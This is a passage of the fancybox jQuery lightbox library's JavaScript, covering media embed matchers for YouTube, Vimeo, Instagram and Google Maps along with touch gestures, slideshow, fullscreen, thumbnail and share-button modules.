      matcher: /(youtube\.com|youtu\.be|youtube\-nocookie\.com)\/(watch\?(.*&)?v=|v\/|u\/|embed\/?)?(videoseries\?list=(.*)|[\w-]{11}|\?listType=(.*)&list=(.*))(.*)/i,
      params: {
        autoplay: 1,
        autohide: 1,
        fs: 1,
        rel: 0,
        hd: 1,
        wmode: "transparent",
        enablejsapi: 1,
        html5: 1
      },
      paramPlace: 8,
      type: "iframe",
      url: "//www.youtube.com/embed/$4",
      thumb: "//img.youtube.com/vi/$4/hqdefault.jpg"
    },
    vimeo: {
      matcher: /^.+vimeo.com\/(.*\/)?([\d]+)(.*)?/,
      params: {
        autoplay: 1,
        hd: 1,
        show_title: 1,
        show_byline: 1,
        show_portrait: 0,
        fullscreen: 1,
        api: 1
      },
      paramPlace: 3,
      type: "iframe",
      url: "//player.vimeo.com/video/$2"
    },
    instagram: {
      matcher: /(instagr\.am|instagram\.com)\/p\/([a-zA-Z0-9_\-]+)\/?/i,
      type: "image",
      url: "//$1/p/$2/media/?size=l"
    },
    gmap_place: {
      matcher: /(maps\.)?google\.([a-z]{2,3}(\.[a-z]{2})?)\/(((maps\/(place\/(.*)\/)?\@(.*),(\d+.?\d+?)z))|(\?ll=))(.*)?/i,
      type: "iframe",
      url: function (e) {
        return "//maps.google." + e[2] + "/?ll=" + (e[9] ? e[9] + "&z=" + Math.floor(e[10]) + (e[12] ? e[12].replace(/^\//, "&") : "") : e[12] + "").replace(/\?/, "&") + "&output=" + (e[12] && 0 < e[12].indexOf("layer=c") ? "svembed" : "embed");
      }
    },
    gmap_search: {
      matcher: /(maps\.)?google\.([a-z]{2,3}(\.[a-z]{2})?)\/(maps\/search\/)(.*)/i,
      type: "iframe",
      url: function (e) {
        return "//maps.google." + e[2] + "/maps?q=" + e[5].replace("query=", "q=").replace("api=1", "") + "&output=embed";
      }
    }
  };
  h(document).on("objectNeedsType.fb", function (e, t, o) {
    var n,
      r,
      a,
      s,
      l,
      d,
      c,
      u = o.src || "",
      p = !1;
    n = h.extend(!0, {}, i, o.opts.media), h.each(n, function (e, t) {
      if (a = u.match(t.matcher)) {
        if (p = t.type, c = e, d = {}, t.paramPlace && a[t.paramPlace]) {
          "?" == (l = a[t.paramPlace])[0] && (l = l.substring(1)), l = l.split("&");
          for (var n = 0; n < l.length; ++n) {
            var i = l[n].split("=", 2);
            2 == i.length && (d[i[0]] = decodeURIComponent(i[1].replace(/\+/g, " ")));
          }
        }
        return s = h.extend(!0, {}, t.params, o.opts[e], d), u = "function" === h.type(t.url) ? t.url.call(this, a, s, o) : f(t.url, a, s), r = "function" === h.type(t.thumb) ? t.thumb.call(this, a, s, o) : f(t.thumb, a), "youtube" === e ? u = u.replace(/&t=((\d+)m)?(\d+)s/, function (e, t, n, i) {
          return "&start=" + ((n ? 60 * parseInt(n, 10) : 0) + parseInt(i, 10));
        }) : "vimeo" === e && (u = u.replace("&%23", "#")), !1;
      }
    }), p ? (o.opts.thumb || o.opts.$thumb && o.opts.$thumb.length || (o.opts.thumb = r), "iframe" === p && (o.opts = h.extend(!0, o.opts, {
      iframe: {
        preload: !1,
        attr: {
          scrolling: "no"
        }
      }
    })), h.extend(o, {
      type: p,
      src: u,
      origSrc: o.src,
      contentSource: c,
      contentType: "image" === p ? "image" : "gmap_place" == c || "gmap_search" == c ? "map" : "video"
    })) : u && (o.type = o.opts.defaultType);
  });
}(window.jQuery || jQuery), function (g, s, m) {
  "use strict";

  function c(e) {
    var t = [];
    for (var n in e = (e = e.originalEvent || e || g.e).touches && e.touches.length ? e.touches : e.changedTouches && e.changedTouches.length ? e.changedTouches : [e]) e[n].pageX ? t.push({
      x: e[n].pageX,
      y: e[n].pageY
    }) : e[n].clientX && t.push({
      x: e[n].clientX,
      y: e[n].clientY
    });
    return t;
  }
  function v(e, t, n) {
    return t && e ? "x" === n ? e.x - t.x : "y" === n ? e.y - t.y : Math.sqrt(Math.pow(e.x - t.x, 2) + Math.pow(e.y - t.y, 2)) : 0;
  }
  function l(e) {
    if (e.is('a,area,button,[role="button"],input,label,select,summary,textarea,video,audio') || m.isFunction(e.get(0).onclick) || e.data("selectable")) return !0;
    for (var t = 0, n = e[0].attributes, i = n.length; t < i; t++) if ("data-fancybox-" === n[t].nodeName.substr(0, 14)) return !0;
    return !1;
  }
  function d(e) {
    for (var t = !1; (n = e.get(0), void 0, i = g.getComputedStyle(n)["overflow-y"], o = g.getComputedStyle(n)["overflow-x"], r = ("scroll" === i || "auto" === i) && n.scrollHeight > n.clientHeight, a = ("scroll" === o || "auto" === o) && n.scrollWidth > n.clientWidth, !(t = r || a)) && (e = e.parent()).length && !e.hasClass("fancybox-stage") && !e.is("body"););
    var n, i, o, r, a;
    return t;
  }
  function n(e) {
    var t = this;
    t.instance = e, t.$bg = e.$refs.bg, t.$stage = e.$refs.stage, t.$container = e.$refs.container, t.destroy(), t.$container.on("touchstart.fb.touch mousedown.fb.touch", m.proxy(t, "ontouchstart"));
  }
  var y = g.requestAnimationFrame || g.webkitRequestAnimationFrame || g.mozRequestAnimationFrame || g.oRequestAnimationFrame || function (e) {
      return g.setTimeout(e, 1e3 / 60);
    },
    b = g.cancelAnimationFrame || g.webkitCancelAnimationFrame || g.mozCancelAnimationFrame || g.oCancelAnimationFrame || function (e) {
      g.clearTimeout(e);
    };
  n.prototype.destroy = function () {
    this.$container.off(".fb.touch");
  }, n.prototype.ontouchstart = function (e) {
    var t = this,
      n = m(e.target),
      i = t.instance,
      o = i.current,
      r = o.$content,
      a = "touchstart" == e.type;
    if (a && t.$container.off("mousedown.fb.touch"), (!e.originalEvent || 2 != e.originalEvent.button) && n.length && !l(n) && !l(n.parent()) && (n.is("img") || !(e.originalEvent.clientX > n[0].clientWidth + n.offset().left))) {
      if (!o || i.isAnimating || i.isClosing) return e.stopPropagation(), void e.preventDefault();
      if (t.realPoints = t.startPoints = c(e), t.startPoints.length) {
        if (e.stopPropagation(), t.startEvent = e, t.canTap = !0, t.$target = n, t.$content = r, t.opts = o.opts.touch, t.isPanning = !1, t.isSwiping = !1, t.isZooming = !1, t.isScrolling = !1, t.startTime = new Date().getTime(), t.distanceX = t.distanceY = t.distance = 0, t.canvasWidth = Math.round(o.$slide[0].clientWidth), t.canvasHeight = Math.round(o.$slide[0].clientHeight), t.contentLastPos = null, t.contentStartPos = m.fancybox.getTranslate(t.$content) || {
          top: 0,
          left: 0
        }, t.sliderStartPos = t.sliderLastPos || m.fancybox.getTranslate(o.$slide), t.stagePos = m.fancybox.getTranslate(i.$refs.stage), t.sliderStartPos.top -= t.stagePos.top, t.sliderStartPos.left -= t.stagePos.left, t.contentStartPos.top -= t.stagePos.top, t.contentStartPos.left -= t.stagePos.left, m(s).off(".fb.touch").on(a ? "touchend.fb.touch touchcancel.fb.touch" : "mouseup.fb.touch mouseleave.fb.touch", m.proxy(t, "ontouchend")).on(a ? "touchmove.fb.touch" : "mousemove.fb.touch", m.proxy(t, "ontouchmove")), m.fancybox.isMobile && s.addEventListener("scroll", t.onscroll, !0), !t.opts && !i.canPan() || !n.is(t.$stage) && !t.$stage.find(n).length) return void (n.is(".fancybox-image") && e.preventDefault());
        m.fancybox.isMobile && (d(n) || d(n.parent())) || e.preventDefault(), 1 !== t.startPoints.length && !o.hasError || (t.instance.canPan() ? (m.fancybox.stop(t.$content), t.$content.css("transition-duration", ""), t.isPanning = !0) : t.isSwiping = !0, t.$container.addClass("fancybox-controls--isGrabbing")), 2 === t.startPoints.length && "image" === o.type && (o.isLoaded || o.$ghost) && (t.canTap = !1, t.isSwiping = !1, t.isPanning = !1, t.isZooming = !0, m.fancybox.stop(t.$content), t.$content.css("transition-duration", ""), t.centerPointStartX = .5 * (t.startPoints[0].x + t.startPoints[1].x) - m(g).scrollLeft(), t.centerPointStartY = .5 * (t.startPoints[0].y + t.startPoints[1].y) - m(g).scrollTop(), t.percentageOfImageAtPinchPointX = (t.centerPointStartX - t.contentStartPos.left) / t.contentStartPos.width, t.percentageOfImageAtPinchPointY = (t.centerPointStartY - t.contentStartPos.top) / t.contentStartPos.height, t.startDistanceBetweenFingers = v(t.startPoints[0], t.startPoints[1]));
      }
    }
  }, n.prototype.onscroll = function (e) {
    this.isScrolling = !0, s.removeEventListener("scroll", this.onscroll, !0);
  }, n.prototype.ontouchmove = function (e) {
    var t = this,
      n = m(e.target);
    return void 0 !== e.originalEvent.buttons && 0 === e.originalEvent.buttons ? void t.ontouchend(e) : t.isScrolling || !n.is(t.$stage) && !t.$stage.find(n).length ? void (t.canTap = !1) : (t.newPoints = c(e), void ((t.opts || t.instance.canPan()) && t.newPoints.length && t.newPoints.length && (t.isSwiping && !0 === t.isSwiping || e.preventDefault(), t.distanceX = v(t.newPoints[0], t.startPoints[0], "x"), t.distanceY = v(t.newPoints[0], t.startPoints[0], "y"), t.distance = v(t.newPoints[0], t.startPoints[0]), 0 < t.distance && (t.isSwiping ? t.onSwipe(e) : t.isPanning ? t.onPan() : t.isZooming && t.onZoom()))));
  }, n.prototype.onSwipe = function (e) {
    var t,
      i = this,
      n = i.isSwiping,
      o = i.sliderStartPos.left || 0;
    if (!0 !== n) "x" == n && (0 < i.distanceX && (i.instance.group.length < 2 || 0 === i.instance.current.index && !i.instance.current.opts.loop) ? o += Math.pow(i.distanceX, .8) : i.distanceX < 0 && (i.instance.group.length < 2 || i.instance.current.index === i.instance.group.length - 1 && !i.instance.current.opts.loop) ? o -= Math.pow(-i.distanceX, .8) : o += i.distanceX), i.sliderLastPos = {
      top: "x" == n ? 0 : i.sliderStartPos.top + i.distanceY,
      left: o
    }, i.requestId && (b(i.requestId), i.requestId = null), i.requestId = y(function () {
      i.sliderLastPos && (m.each(i.instance.slides, function (e, t) {
        var n = t.pos - i.instance.currPos;
        m.fancybox.setTranslate(t.$slide, {
          top: i.sliderLastPos.top,
          left: i.sliderLastPos.left + n * i.canvasWidth + n * t.opts.gutter
        });
      }), i.$container.addClass("fancybox-is-sliding"));
    });else if (10 < Math.abs(i.distance)) {
      if (i.canTap = !1, i.instance.group.length < 2 && i.opts.vertical ? i.isSwiping = "y" : i.instance.isDragging || !1 === i.opts.vertical || "auto" === i.opts.vertical && 800 < m(g).width() ? i.isSwiping = "x" : (t = Math.abs(180 * Math.atan2(i.distanceY, i.distanceX) / Math.PI), i.isSwiping = 45 < t && t < 135 ? "y" : "x"), i.canTap = !1, "y" === i.isSwiping && m.fancybox.isMobile && (d(i.$target) || d(i.$target.parent()))) return void (i.isScrolling = !0);
      i.instance.isDragging = i.isSwiping, i.startPoints = i.newPoints, m.each(i.instance.slides, function (e, t) {
        m.fancybox.stop(t.$slide), t.$slide.css("transition-duration", ""), t.inTransition = !1, t.pos === i.instance.current.pos && (i.sliderStartPos.left = m.fancybox.getTranslate(t.$slide).left - m.fancybox.getTranslate(i.instance.$refs.stage).left);
      }), i.instance.SlideShow && i.instance.SlideShow.isActive && i.instance.SlideShow.stop();
    }
  }, n.prototype.onPan = function () {
    var e = this;
    return v(e.newPoints[0], e.realPoints[0]) < (m.fancybox.isMobile ? 10 : 5) ? void (e.startPoints = e.newPoints) : (e.canTap = !1, e.contentLastPos = e.limitMovement(), e.requestId && (b(e.requestId), e.requestId = null), void (e.requestId = y(function () {
      m.fancybox.setTranslate(e.$content, e.contentLastPos);
    })));
  }, n.prototype.limitMovement = function () {
    var e,
      t,
      n,
      i,
      o,
      r,
      a = this,
      s = a.canvasWidth,
      l = a.canvasHeight,
      d = a.distanceX,
      c = a.distanceY,
      u = a.contentStartPos,
      p = u.left,
      h = u.top,
      f = u.width,
      g = u.height;
    return o = s < f ? p + d : p, r = h + c, e = Math.max(0, .5 * s - .5 * f), t = Math.max(0, .5 * l - .5 * g), n = Math.min(s - f, .5 * s - .5 * f), i = Math.min(l - g, .5 * l - .5 * g), 0 < d && e < o && (o = e - 1 + Math.pow(-e + p + d, .8) || 0), d < 0 && o < n && (o = n + 1 - Math.pow(n - p - d, .8) || 0), 0 < c && t < r && (r = t - 1 + Math.pow(-t + h + c, .8) || 0), c < 0 && r < i && (r = i + 1 - Math.pow(i - h - c, .8) || 0), {
      top: r,
      left: o
    };
  }, n.prototype.limitPosition = function (e, t, n, i) {
    var o = this.canvasWidth,
      r = this.canvasHeight;
    return e = o < n ? (e = 0 < e ? 0 : e) < o - n ? o - n : e : Math.max(0, o / 2 - n / 2), {
      top: t = r < i ? (t = 0 < t ? 0 : t) < r - i ? r - i : t : Math.max(0, r / 2 - i / 2),
      left: e
    };
  }, n.prototype.onZoom = function () {
    var e = this,
      t = e.contentStartPos,
      n = t.width,
      i = t.height,
      o = t.left,
      r = t.top,
      a = v(e.newPoints[0], e.newPoints[1]) / e.startDistanceBetweenFingers,
      s = Math.floor(n * a),
      l = Math.floor(i * a),
      d = (n - s) * e.percentageOfImageAtPinchPointX,
      c = (i - l) * e.percentageOfImageAtPinchPointY,
      u = (e.newPoints[0].x + e.newPoints[1].x) / 2 - m(g).scrollLeft(),
      p = (e.newPoints[0].y + e.newPoints[1].y) / 2 - m(g).scrollTop(),
      h = u - e.centerPointStartX,
      f = {
        top: r + (c + (p - e.centerPointStartY)),
        left: o + (d + h),
        scaleX: a,
        scaleY: a
      };
    e.canTap = !1, e.newWidth = s, e.newHeight = l, e.contentLastPos = f, e.requestId && (b(e.requestId), e.requestId = null), e.requestId = y(function () {
      m.fancybox.setTranslate(e.$content, e.contentLastPos);
    });
  }, n.prototype.ontouchend = function (e) {
    var t = this,
      n = Math.max(new Date().getTime() - t.startTime, 1),
      i = t.isSwiping,
      o = t.isPanning,
      r = t.isZooming,
      a = t.isScrolling;
    return t.endPoints = c(e), t.$container.removeClass("fancybox-controls--isGrabbing"), m(s).off(".fb.touch"), s.removeEventListener("scroll", t.onscroll, !0), t.requestId && (b(t.requestId), t.requestId = null), t.isSwiping = !1, t.isPanning = !1, t.isZooming = !1, t.isScrolling = !1, t.instance.isDragging = !1, t.canTap ? t.onTap(e) : (t.speed = 366, t.velocityX = t.distanceX / n * .5, t.velocityY = t.distanceY / n * .5, t.speedX = Math.max(.5 * t.speed, Math.min(1.5 * t.speed, 1 / Math.abs(t.velocityX) * t.speed)), void (o ? t.endPanning() : r ? t.endZooming() : t.endSwiping(i, a)));
  }, n.prototype.endSwiping = function (e, t) {
    var n = this,
      i = !1,
      o = n.instance.group.length;
    n.sliderLastPos = null, "y" == e && !t && 50 < Math.abs(n.distanceY) ? (m.fancybox.animate(n.instance.current.$slide, {
      top: n.sliderStartPos.top + n.distanceY + 150 * n.velocityY,
      opacity: 0
    }, 200), i = n.instance.close(!0, 200)) : "x" == e && 50 < n.distanceX && 1 < o ? i = n.instance.previous(n.speedX) : "x" == e && n.distanceX < -50 && 1 < o && (i = n.instance.next(n.speedX)), !1 !== i || "x" != e && "y" != e || (t || o < 2 ? n.instance.centerSlide(n.instance.current, 150) : n.instance.jumpTo(n.instance.current.index)), n.$container.removeClass("fancybox-is-sliding");
  }, n.prototype.endPanning = function () {
    var e,
      t,
      n,
      i = this;
    i.contentLastPos && (t = !1 === i.opts.momentum ? (e = i.contentLastPos.left, i.contentLastPos.top) : (e = i.contentLastPos.left + i.velocityX * i.speed, i.contentLastPos.top + i.velocityY * i.speed), (n = i.limitPosition(e, t, i.contentStartPos.width, i.contentStartPos.height)).width = i.contentStartPos.width, n.height = i.contentStartPos.height, m.fancybox.animate(i.$content, n, 330));
  }, n.prototype.endZooming = function () {
    var e,
      t,
      n,
      i,
      o = this,
      r = o.instance.current,
      a = o.newWidth,
      s = o.newHeight;
    o.contentLastPos && (e = o.contentLastPos.left, i = {
      top: t = o.contentLastPos.top,
      left: e,
      width: a,
      height: s,
      scaleX: 1,
      scaleY: 1
    }, m.fancybox.setTranslate(o.$content, i), a < o.canvasWidth && s < o.canvasHeight ? o.instance.scaleToFit(150) : a > r.width || s > r.height ? o.instance.scaleToActual(o.centerPointStartX, o.centerPointStartY, 150) : (n = o.limitPosition(e, t, a, s), m.fancybox.setTranslate(o.$content, m.fancybox.getTranslate(o.$content)), m.fancybox.animate(o.$content, n, 150)));
  }, n.prototype.onTap = function (n) {
    function e(e) {
      var t = a.opts[e];
      if (m.isFunction(t) && (t = t.apply(r, [a, n])), t) switch (t) {
        case "close":
          r.close(i.startEvent);
          break;
        case "toggleControls":
          r.toggleControls(!0);
          break;
        case "next":
          r.next();
          break;
        case "nextOrClose":
          1 < r.group.length ? r.next() : r.close(i.startEvent);
          break;
        case "zoom":
          "image" == a.type && (a.isLoaded || a.$ghost) && (r.canPan() ? r.scaleToFit() : r.isScaledDown() ? r.scaleToActual(l, d) : r.group.length < 2 && r.close(i.startEvent));
      }
    }
    var t,
      i = this,
      o = m(n.target),
      r = i.instance,
      a = r.current,
      s = n && c(n) || i.startPoints,
      l = s[0] ? s[0].x - m(g).scrollLeft() - i.stagePos.left : 0,
      d = s[0] ? s[0].y - m(g).scrollTop() - i.stagePos.top : 0;
    if ((!n.originalEvent || 2 != n.originalEvent.button) && (o.is("img") || !(l > o[0].clientWidth + o.offset().left))) {
      if (o.is(".fancybox-bg,.fancybox-inner,.fancybox-outer,.fancybox-container")) t = "Outside";else if (o.is(".fancybox-slide")) t = "Slide";else {
        if (!r.current.$content || !r.current.$content.find(o).addBack().filter(o).length) return;
        t = "Content";
      }
      if (i.tapped) {
        if (clearTimeout(i.tapped), i.tapped = null, 50 < Math.abs(l - i.tapX) || 50 < Math.abs(d - i.tapY)) return this;
        e("dblclick" + t);
      } else i.tapX = l, i.tapY = d, a.opts["dblclick" + t] && a.opts["dblclick" + t] !== a.opts["click" + t] ? i.tapped = setTimeout(function () {
        i.tapped = null, e("click" + t);
      }, 500) : e("click" + t);
      return this;
    }
  }, m(s).on("onActivate.fb", function (e, t) {
    t && !t.Guestures && (t.Guestures = new n(t));
  });
}(window, document, window.jQuery || jQuery), function (a, s) {
  "use strict";

  s.extend(!0, s.fancybox.defaults, {
    btnTpl: {
      slideShow: '<button data-fancybox-play class="fancybox-button fancybox-button--play" title="{{PLAY_START}}"><svg viewBox="0 5 40 40"><path d="M13,12 L27,20 L13,27 Z" /><path d="M15,10 v19 M23,10 v19" /></svg></button>'
    },
    slideShow: {
      autoStart: !1,
      speed: 3e3
    }
  });
  function n(e) {
    this.instance = e, this.init();
  }
  s.extend(n.prototype, {
    timer: null,
    isActive: !1,
    $button: null,
    init: function () {
      var e = this;
      e.$button = e.instance.$refs.toolbar.find("[data-fancybox-play]").on("click", function () {
        e.toggle();
      }), (e.instance.group.length < 2 || !e.instance.group[e.instance.currIndex].opts.slideShow) && e.$button.hide();
    },
    set: function (e) {
      var t = this;
      t.instance && t.instance.current && (!0 === e || t.instance.current.opts.loop || t.instance.currIndex < t.instance.group.length - 1) ? t.timer = setTimeout(function () {
        t.isActive && t.instance.jumpTo((t.instance.currIndex + 1) % t.instance.group.length);
      }, t.instance.current.opts.slideShow.speed) : (t.stop(), t.instance.idleSecondsCounter = 0, t.instance.showControls());
    },
    clear: function () {
      clearTimeout(this.timer), this.timer = null;
    },
    start: function () {
      var e = this.instance.current;
      e && (this.isActive = !0, this.$button.attr("title", e.opts.i18n[e.opts.lang].PLAY_STOP).removeClass("fancybox-button--play").addClass("fancybox-button--pause"), this.set(!0));
    },
    stop: function () {
      var e = this.instance.current;
      this.clear(), this.$button.attr("title", e.opts.i18n[e.opts.lang].PLAY_START).removeClass("fancybox-button--pause").addClass("fancybox-button--play"), this.isActive = !1;
    },
    toggle: function () {
      this.isActive ? this.stop() : this.start();
    }
  }), s(a).on({
    "onInit.fb": function (e, t) {
      t && !t.SlideShow && (t.SlideShow = new n(t));
    },
    "beforeShow.fb": function (e, t, n, i) {
      var o = t && t.SlideShow;
      i ? o && n.opts.slideShow.autoStart && o.start() : o && o.isActive && o.clear();
    },
    "afterShow.fb": function (e, t, n) {
      var i = t && t.SlideShow;
      i && i.isActive && i.set();
    },
    "afterKeydown.fb": function (e, t, n, i, o) {
      var r = t && t.SlideShow;
      !r || !n.opts.slideShow || 80 !== o && 32 !== o || s(a.activeElement).is("button,a,input") || (i.preventDefault(), r.toggle());
    },
    "beforeClose.fb onDeactivate.fb": function (e, t) {
      var n = t && t.SlideShow;
      n && n.stop();
    }
  }), s(a).on("visibilitychange", function () {
    var e = s.fancybox.getInstance(),
      t = e && e.SlideShow;
    t && t.isActive && (a.hidden ? t.clear() : t.set());
  });
}(document, window.jQuery || jQuery), function (r, n) {
  "use strict";

  var t = function () {
    for (var e = [["requestFullscreen", "exitFullscreen", "fullscreenElement", "fullscreenEnabled", "fullscreenchange", "fullscreenerror"], ["webkitRequestFullscreen", "webkitExitFullscreen", "webkitFullscreenElement", "webkitFullscreenEnabled", "webkitfullscreenchange", "webkitfullscreenerror"], ["webkitRequestFullScreen", "webkitCancelFullScreen", "webkitCurrentFullScreenElement", "webkitCancelFullScreen", "webkitfullscreenchange", "webkitfullscreenerror"], ["mozRequestFullScreen", "mozCancelFullScreen", "mozFullScreenElement", "mozFullScreenEnabled", "mozfullscreenchange", "mozfullscreenerror"], ["msRequestFullscreen", "msExitFullscreen", "msFullscreenElement", "msFullscreenEnabled", "MSFullscreenChange", "MSFullscreenError"]], t = {}, n = 0; n < e.length; n++) {
      var i = e[n];
      if (i && i[1] in r) {
        for (var o = 0; o < i.length; o++) t[e[0][o]] = i[o];
        return t;
      }
    }
    return !1;
  }();
  if (t) {
    var i = {
      request: function (e) {
        (e = e || r.documentElement)[t.requestFullscreen](e.ALLOW_KEYBOARD_INPUT);
      },
      exit: function () {
        r[t.exitFullscreen]();
      },
      toggle: function (e) {
        e = e || r.documentElement, this.isFullscreen() ? this.exit() : this.request(e);
      },
      isFullscreen: function () {
        return Boolean(r[t.fullscreenElement]);
      },
      enabled: function () {
        return Boolean(r[t.fullscreenEnabled]);
      }
    };
    n.extend(!0, n.fancybox.defaults, {
      btnTpl: {
        fullScreen: '<button data-fancybox-fullscreen class="fancybox-button fancybox-button--fullscreen" title="{{FULL_SCREEN}}"><svg viewBox="0 5 40 40"><path d="M9,12 v16 h22 v-16 h-22 v8" /></svg></button>'
      },
      fullScreen: {
        autoStart: !1
      }
    }), n(r).on({
      "onInit.fb": function (e, t) {
        t && t.group[t.currIndex].opts.fullScreen ? (t.$refs.container.on("click.fb-fullscreen", "[data-fancybox-fullscreen]", function (e) {
          e.stopPropagation(), e.preventDefault(), i.toggle();
        }), t.opts.fullScreen && !0 === t.opts.fullScreen.autoStart && i.request(), t.FullScreen = i) : t && t.$refs.toolbar.find("[data-fancybox-fullscreen]").hide();
      },
      "afterKeydown.fb": function (e, t, n, i, o) {
        t && t.FullScreen && 70 === o && (i.preventDefault(), t.FullScreen.toggle());
      },
      "beforeClose.fb": function (e, t) {
        t && t.FullScreen && t.$refs.container.hasClass("fancybox-is-fullscreen") && i.exit();
      }
    }), n(r).on(t.fullscreenchange, function () {
      var e = i.isFullscreen(),
        t = n.fancybox.getInstance();
      t && (t.current && "image" === t.current.type && t.isAnimating && (t.current.$content.css("transition", "none"), t.isAnimating = !1, t.update(!0, !0, 0)), t.trigger("onFullscreenChange", e), t.$refs.container.toggleClass("fancybox-is-fullscreen", e));
    });
  } else n && n.fancybox && (n.fancybox.defaults.btnTpl.fullScreen = !1);
}(document, window.jQuery || jQuery), function (e, r) {
  "use strict";

  var a = "fancybox-thumbs",
    s = a + "-active";
  r.fancybox.defaults = r.extend(!0, {
    btnTpl: {
      thumbs: '<button data-fancybox-thumbs class="fancybox-button fancybox-button--thumbs" title="{{THUMBS}}"><svg viewBox="0 5 120 120"><path d="M30,30 h14 v14 h-14 Z M50,30 h14 v14 h-14 Z M70,30 h14 v14 h-14 Z M30,50 h14 v14 h-14 Z M50,50 h14 v14 h-14 Z M70,50 h14 v14 h-14 Z M30,70 h14 v14 h-14 Z M50,70 h14 v14 h-14 Z M70,70 h14 v14 h-14 Z" /></svg></button>'
    },
    thumbs: {
      autoStart: !1,
      hideOnClose: !0,
      parentEl: ".fancybox-container",
      axis: "y"
    }
  }, r.fancybox.defaults);
  function i(e) {
    this.init(e);
  }
  r.extend(i.prototype, {
    $button: null,
    $grid: null,
    $list: null,
    isVisible: !1,
    isActive: !1,
    init: function (e) {
      var t,
        n,
        i = this;
      ((i.instance = e).Thumbs = i).opts = e.group[e.currIndex].opts.thumbs, t = (t = e.group[0]).opts.thumb || !(!t.opts.$thumb || !t.opts.$thumb.length) && t.opts.$thumb.attr("src"), 1 < e.group.length && (n = (n = e.group[1]).opts.thumb || !(!n.opts.$thumb || !n.opts.$thumb.length) && n.opts.$thumb.attr("src")), i.$button = e.$refs.toolbar.find("[data-fancybox-thumbs]"), i.opts && t && n && t && n ? (i.$button.show().on("click", function () {
        i.toggle();
      }), i.isActive = !0) : i.$button.hide();
    },
    create: function () {
      var n,
        e = this,
        t = e.instance,
        i = e.opts.parentEl,
        o = [];
      e.$grid || (e.$grid = r('<div class="' + a + " " + a + "-" + e.opts.axis + '"></div>').appendTo(t.$refs.container.find(i).addBack().filter(i)), e.$grid.on("click", "li", function () {
        t.jumpTo(r(this).attr("data-index"));
      })), e.$list || (e.$list = r("<ul>").appendTo(e.$grid)), r.each(t.group, function (e, t) {
        (n = t.opts.thumb || (t.opts.$thumb ? t.opts.$thumb.attr("src") : null)) || "image" !== t.type || (n = t.src), o.push('<li data-index="' + e + '" tabindex="0" class="fancybox-thumbs-loading"' + (n && n.length ? ' style="background-image:url(' + n + ')" />' : "") + "></li>");
      }), e.$list[0].innerHTML = o.join(""), "x" === e.opts.axis && e.$list.width(parseInt(e.$grid.css("padding-right"), 10) + t.group.length * e.$list.children().eq(0).outerWidth(!0));
    },
    focus: function (e) {
      var t,
        n,
        i = this.$list,
        o = this.$grid;
      this.instance.current && (n = (t = i.children().removeClass(s).filter('[data-index="' + this.instance.current.index + '"]').addClass(s)).position(), "y" === this.opts.axis && (n.top < 0 || n.top > i.height() - t.outerHeight()) ? i.stop().animate({
        scrollTop: i.scrollTop() + n.top
      }, e) : "x" === this.opts.axis && (n.left < o.scrollLeft() || n.left > o.scrollLeft() + (o.width() - t.outerWidth())) && i.parent().stop().animate({
        scrollLeft: n.left
      }, e));
    },
    update: function () {
      this.instance.$refs.container.toggleClass("fancybox-show-thumbs", this.isVisible), this.isVisible ? (this.$grid || this.create(), this.instance.trigger("onThumbsShow"), this.focus(0)) : this.$grid && this.instance.trigger("onThumbsHide"), this.instance.update();
    },
    hide: function () {
      this.isVisible = !1, this.update();
    },
    show: function () {
      this.isVisible = !0, this.update();
    },
    toggle: function () {
      this.isVisible = !this.isVisible, this.update();
    }
  }), r(e).on({
    "onInit.fb": function (e, t) {
      var n;
      !t || t.Thumbs || (n = new i(t)).isActive && !0 === n.opts.autoStart && n.show();
    },
    "beforeShow.fb": function (e, t, n, i) {
      var o = t && t.Thumbs;
      o && o.isVisible && o.focus(i ? 0 : 250);
    },
    "afterKeydown.fb": function (e, t, n, i, o) {
      var r = t && t.Thumbs;
      r && r.isActive && 71 === o && (i.preventDefault(), r.toggle());
    },
    "beforeClose.fb": function (e, t) {
      var n = t && t.Thumbs;
      n && n.isVisible && !1 !== n.opts.hideOnClose && n.$grid.hide();
    }
  });
}(document, window.jQuery || jQuery), function (e, r) {
  "use strict";

  r.extend(!0, r.fancybox.defaults, {
    btnTpl: {
      share: '<button data-fancybox-share class="fancybox-button fancybox-button--share" title="{{SHARE}}"><svg viewBox="0 0 40 40"><path d="M6,30 C8,18 19,16 23,16 L23,16 L23,10 L33,20 L23,29 L23,24 C19,24 8,27 6,30 Z"></svg></button>'
    },
    share: {
      url: function (e, t) {
        return !e.currentHash && "inline" !== t.type && "html" !== t.type && (t.origSrc || t.src) || window.location;
      },
      tpl: '<div class="fancybox-share"><h1>{{SHARE}}</h1><p><a class="fancybox-share__button fancybox-share__button--fb" href="https://www.facebook.com/sharer/sharer.php?u={{url}}"><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="m287 456v-299c0-21 6-35 35-35h38v-63c-7-1-29-3-55-3-54 0-91 33-91 94v306m143-254h-205v72h196" /></svg><span>Facebook</span></a><a class="fancybox-share__button fancybox-share__button--tw" href="https://twitter.com/intent/tweet?url={{url}}&text={{descr}}"><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="m456 133c-14 7-31 11-47 13 17-10 30-27 37-46-15 10-34 16-52 20-61-62-157-7-141 75-68-3-129-35-169-85-22 37-11 86 26 109-13 0-26-4-37-9 0 39 28 72 65 80-12 3-25 4-37 2 10 33 41 57 77 57-42 30-77 38-122 34 170 111 378-32 359-208 16-11 30-25 41-42z" /></svg><span>Twitter</span></a><a class="fancybox-share__button fancybox-share__button--pt" href="https://www.pinterest.com/pin/create/button/?url={{url}}&description={{descr}}&media={{media}}"><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="m265 56c-109 0-164 78-164 144 0 39 15 74 47 87 5 2 10 0 12-5l4-19c2-6 1-8-3-13-9-11-15-25-15-45 0-58 43-110 113-110 62 0 96 38 96 88 0 67-30 122-73 122-24 0-42-19-36-44 6-29 20-60 20-81 0-19-10-35-31-35-25 0-44 26-44 60 0 21 7 36 7 36l-30 125c-8 37-1 83 0 87 0 3 4 4 5 2 2-3 32-39 42-75l16-64c8 16 31 29 56 29 74 0 124-67 124-157 0-69-58-132-146-132z" fill="#fff"/></svg><span>Pinterest</span></a></p><p><input class="fancybox-share__input" type="text" value="{{url_raw}}" /></p></div>'
    }
  }), r(e).on("click", "[data-fancybox-share]", function () {
    var e,
      t,
      n,
      i = r.fancybox.getInstance(),
      o = i.current || null;
